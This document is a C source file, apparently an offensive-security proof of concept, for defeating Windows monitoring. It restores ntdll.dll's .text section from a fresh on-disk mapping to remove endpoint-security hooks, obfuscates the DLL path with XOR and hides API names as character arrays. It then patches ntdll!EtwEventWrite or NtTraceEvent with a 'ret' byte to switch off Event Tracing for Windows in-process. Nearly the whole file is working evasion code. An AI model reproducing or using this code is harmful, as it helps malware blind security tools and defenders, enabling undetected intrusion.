/*
	Patch ETW for User Space
*/

#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <metahost.h> 
#include <evntprov.h>

#pragma comment (lib, "advapi32")
#pragma comment(lib, "mscoree.lib")

typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);

VirtualProtect_t VirtualProtect_p = NULL;

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };


void XORcrypt(char str2xor[], size_t len, char key) {
/*
        XORcrypt() is a simple XOR encoding/decoding function
*/
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
/*
    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
	int i;


	// find .text section
	for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *)pish->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
			if (!oldprotect) {
					// RWX failed!
					return -1;
			}
			// copy original .text section into ntdll memory
			memcpy( (LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

			// restore original protection settings of ntdll
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
			if (!oldprotect) {
					// it failed
					return -1;
			}
			// all is good, time to go home
			return 0;
		}
	}
	// .text section not found?
	return -1;
}


void DisableETW(void)
{
	DWORD oldprotect = 0;
	
	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	void *pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);

	unsigned char sNtTraceEvent[] = { 'N','t','T','r','a','c','e','E','v','e','n','t', 0x0 };	
	void *pNtTraceEvent = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sNtTraceEvent);


	printf("[?] Patch ETW via:\n1. EventWrite func \n2. NtTraceEvent syscall \n[1/2]\n");
	int Num;
	scanf("%d", &Num);

	if (Num == 1)
	{
		VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
		printf("\n[*] Disabling ETW:\nPasting `ret` opcode bytes (0xc3) at the beginning of ntdll!EtwEventWrite function (x64)\n\t=> Skipping Security Check done by `ntdll!__security_check_cookie`\n");	

#ifdef _WIN64

		// Only pasting `ret` opcode bytes (0xc3) at the beginning of ntdll!EtwEventWrite (x64) to Skip Security Check done by `ntdll!__security_check_cookie`
		//: link: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Event_Tracing_for_Windows

		// Only \xc3 would do the work, but other instructions are added for dealing stack alignment (if in case)
		//memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
		memcpy(pEventWrite, "\xc3", 1);

#else
		memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

		VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);

		FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);

	}
	else if (Num == 2)
	{
		VirtualProtect_p(pNtTraceEvent, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
		printf("\n[*] Disabling ETW:\nPasting `ret` opcode bytes (0xc3) at the beginning of ntdll!NtTraceEvent function (x64)\n\t=> Skipping sycall\n");

#ifdef _WIN64

		// Only pasting `ret` opcode bytes (0xc3) at the beginning of ntdll!EtwEventWrite (x64) to Skip Security Check done by `ntdll!__security_check_cookie`
		//: link: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Event_Tracing_for_Windows

		// Only \xc3 would do the work, but other instructions are added for dealing stack alignment (if in case)
		//memcpy(pNtTraceEvent, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
		memcpy(pNtTraceEvent, "\xc3", 1);
#else
		memcpy(pNtTraceEvent, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

		VirtualProtect_p(pNtTraceEvent, 4096, oldprotect, &oldprotect);

		FlushInstructionCache(GetCurrentProcess(), pNtTraceEvent, 4096);
	}
}


int SummonCLR(void)
{
	HRESULT hr;
	ICLRMetaHost *pMetaHost = NULL;
	IEnumUnknown *installedRuntimes = NULL;
	ICLRRuntimeInfo *runtimeInfo = NULL;
	ICLRRuntimeHost *runtimeHost = NULL;
	ULONG fetched = 0;
	
	wprintf(L"[+] Now Loading CLR...\n");

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
	if (hr != S_OK) {
		wprintf(L"[!] Error: CLRCreateInstance...\n");
		goto Cleanup;
	}

	hr = pMetaHost->EnumerateInstalledRuntimes(&installedRuntimes);
	if (hr != S_OK) {
		wprintf(L"[!] Error: EnumerateInstalledRuntimes...\n");
		goto Cleanup;
	}

	WCHAR versionString[20];
	while ((hr = installedRuntimes->Next(1, (IUnknown **)&runtimeInfo, &fetched)) == S_OK && fetched > 0) {
		DWORD versionStringSize = 20;
		hr = runtimeInfo->GetVersionString(versionString, &versionStringSize);
		
		if (runtimeInfo != NULL) {
			wprintf(L"[+] Supported Framework: %s\n", versionString);
		}

		if (versionStringSize >= 2 && versionString[1] == '4') {	// Look for .NET 4.0 runtime.
			wprintf(L"[+] Using runtime: %s\n", versionString);
			break;
		}
	}

	hr = runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (void **)&runtimeHost);
	if (hr != S_OK) {
		wprintf(L"[!] Error: GetInterface(CLSID_CLRRuntimeHost...) failed...\n");
		goto Cleanup;
	}

	hr = runtimeHost->Start();
	if (hr != S_OK) {
		wprintf(L"[!] Error: Start runtimeHost failed...\n");
		goto Cleanup;
	}
	
Cleanup:

	if (pMetaHost) {
		pMetaHost->Release();
		pMetaHost = NULL;
	}

	return 0;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	
	unsigned int sNtdllPath_len = sizeof(sNtdllPath);
	unsigned int sNtdll_len = sizeof(sNtdll);
	int ret = 0;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID pMapping;

	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);
	VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	
	// open ntdll.dll
	XORcrypt((char *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
	hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( hFile == INVALID_HANDLE_VALUE ) {
			// failed to open ntdll.dll
			return -1;
	}

	// prepare file mapping
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! hFileMapping) {
			// file mapping failed

			CloseHandle(hFile);
			return -1;
	}
	
	// map the bastard
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
					// mapping failed
					CloseHandle(hFileMapping);
					CloseHandle(hFile);
					return -1;
	}
	
	// remove hooks
	ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);

	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);

	printf("PID: %d\n", GetCurrentProcessId());

	LoadLibrary("clr.dll");
	SummonCLR();

	printf("Before disabling ETW\n"); getchar();

	DisableETW();

	printf("After disabling ETW\n");

	// Just For Debugging Purposes: getchar() wasn't working actually
	printf("Enter: ");
	int Num;
	scanf("%d", &Num);

	return 0;
}
